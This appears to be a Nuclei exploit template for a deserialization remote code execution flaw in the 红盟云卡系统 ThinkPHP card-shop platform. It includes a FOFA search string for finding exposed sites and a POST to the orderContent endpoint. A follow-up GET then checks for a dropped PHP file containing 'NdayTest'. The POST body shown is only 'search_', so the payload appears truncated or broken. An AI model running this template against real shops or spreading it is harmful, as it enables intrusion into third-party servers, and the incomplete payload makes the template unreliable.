id: hongmeng-card-system-deserialization-rce

info:
  name: "红盟云卡系统 OrderContent 参数反序列化导致远程代码执行"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: Fofa:"/assets/shop/dist/uaredirect.js?v=1.2.0"
          红盟云卡系统为基于ThinkPHP框架构建的虚拟商品销售平台，具备多规格商品管理、微信订单集成及分站部署功能。在 /application/shop/controller/Order.php 组件中，orderContent 参数经 unserialize 反序列化处理时未有效过滤输入数据，攻击者可利用已知反序列化链构造恶意负载，通过前端接口触发任意代码执行。该漏洞源于反序列化操作对用户输入的直接处理，结合可利用的类方法链实现代码注入。
  tags: 红盟云卡系统

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /shop/order/orderContent?order_no=123 HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded

    search_
- raw:
  - |
    GET /a.php12ac95f1498ce51d2d96a249c09c1998.php HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
